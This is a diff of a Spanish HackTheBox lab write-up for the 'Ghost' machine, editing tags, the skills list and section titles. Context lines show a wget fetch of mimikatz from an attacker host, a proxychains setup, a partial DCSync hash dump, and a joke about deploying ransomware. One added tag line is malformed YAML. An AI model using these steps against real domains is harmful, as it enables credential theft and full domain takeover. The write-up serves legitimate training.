@@ -4,10 +4,9 @@ permalink: /Ghost-HTB-Writeup/
 tags:
   - "Windows"
   - "Insane"
-  - "HackTheBox"
   - "LDAP Injection"
   - "Python Scripting"
-  - "API Abusing"
+  - "API Abuse"
   - "SSH Multiplexing"
   - "ADIDNS Poisoning"
   - "Stealing Net-NTLMv2 Hash"
@@ -18,12 +17,13 @@ tags:
   - "DC Sync"
   - "Hash Cracking"
   - "PassTheHash"
-  - "Abusing xp_cmdshell"
+  - "xp_cmdshell"
   - "Powershell"
   - "Mimikatz"
   - "SeImpersonatePrivilege"
   - "Proxychains"
   - "Chisel"
+   "Port Forwarding"
 categories:
   - writeup
   - hacking
@@ -46,7 +46,7 @@ header:
 
 ![image-center](/assets/images/posts/ghost-hackthebox.png){: .align-center}
 
-**Habilidades:** Virtual Hosting, LDAP Injection, Blind LDAP Injection - Credential Brute Forcing (Python Scripting), Local File Inclusion (GhostCMS), Abusing Ghost CMS Api (Command Injection), Abusing SSH Multiplexing, ADIDNS Poisoning - `dnstool.py`, Stealing NetNTLMv2 Hashes With `Responder.py`, Hash Cracking (NetNTLMv2), DC Enumeration (SharpHound.exe), ReadGMSAPassword, PassTheHash (Evil-WinRM), Golden SAML Attack using `ADFSpoof.py`, Abusing SQL Server `xp_cmdshell` to RCE, Powershell Reverse Shell Obfuscation (PowerJoker), Abusing SeImpersonatePrivilege (EfsPotato.exe) [Local Privilege Escalation], DCSync Using Mimikatz, Golden Ticket Attack - Requesting TGT using `ticketer.py`, Pivoting with Chisel + PassTheTicket (`proxychains` + `secretsdump.py`) [Privilege Escalation], Golden Ticket Attack using Bash Scripting
+**Habilidades:** Virtual Hosting, LDAP Injection, Blind LDAP Injection - Credential Brute Forcing (Python Scripting), Local File Inclusion (GhostCMS), Abusing Ghost CMS Api (Command Injection), Abusing SSH Multiplexing, ADIDNS Poisoning - `dnstool.py`, Stealing NetNTLMv2 Hashes With `Responder.py`, Hash Cracking (NetNTLMv2), DC Enumeration (SharpHound.exe), ReadGMSAPassword, PassTheHash (Evil-WinRM), Golden SAML Attack using `ADFSpoof.py`, Abusing SQL Server `xp_cmdshell` to RCE, Powershell Reverse Shell Obfuscation (PowerJoker), Abusing SeImpersonatePrivilege (EfsPotato.exe) [Local Privilege Escalation], DCSync Using Mimikatz, Golden Ticket Attack - Requesting TGT using `ticketer.py`, Port Forwarding with Chisel, PassTheTicket, Shadow Credentials [Privilege Escalation], Golden Ticket Attack using Bash Scripting
 {: .notice--primary}
 
 # Introducción
@@ -1603,7 +1603,7 @@ JokerShell C:\Temp> wget http://10.10.x.x/mimikatz.exe -o mimikatz.exe
 ~~~
 
 
-## Setup Proxy to Domain Controller (Chisel + Proxychains)
+## Port Forwarding (Chisel + Proxychains)
 
 En cuanto al ataque del controlador de dominio, existe una posibilidad de realizar un DCSync Attack, sin embargo, existe el impedimento de no poseer una consola totalmente interactiva con `powershell` debido al uso de la herramienta que estamos usando. Podemos hacer el ataque desde nuestro Linux en vez de usar `Rubeus` para solicitar un ticket
 
@@ -1638,7 +1638,7 @@ socks5 127.0.0.1 1080
 - Activar `dynamic_chain` quitando el comentario de la línea
 
 
-## DCSync Attack 
+## DCSync
 
 En este punto estamos alcanzando `dc01.ghost.htb` pasando por `primary.ghost.htb`. El siguiente paso es crear un `TGT` para usarlo frente a `dc01.ghost.htb` enviando la comunicación a través de `primary.ghost.htb`
 
@@ -1718,7 +1718,7 @@ export KRB5CCNAME=Administrator.ccache
 ~~~
 
 
-## PassTheTicket
+## DCSync
 
 Ya con el ticket inyectado y con el culo cuadrado por tanto rato sentado, usaremos el ticket para obtener los hashes `NT` de todos los usuarios del dominio
 
@@ -1740,7 +1740,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0cdb...:::
 ~~~
 
 
-## Golden Ticket - Bash Scripting
+## DCSync + Golden Ticket + DCSync - Bash Scripting
 
 En caso que debamos automatizar el ataque porque nos da pereza, podemos definir los comandos en un script que llamaremos `privesc.sh` (sólo si tu quieres), donde realizamos el ataque en un bucle infinito cada tres segundos, cuando veas los hashes solo presionamos `Ctrl + C` para detener su ejecución y no ver todos los hashes a cada rato
 
@@ -1775,7 +1775,7 @@ done
 ~~~
 
 
-## Shell as `Administrator` - PassTheHash
+## PassTheHash
 
 Una vez extraído el hash `NT` del usuario `Administrator` del dominio, es posible hacer `PassTheHash`, y de esta forma conectarnos a la máquina víctima con una consola de `powershell` y eliminar toda la información del dominio o inyectar un `Ransomware` o lo que te dé la gana 
 
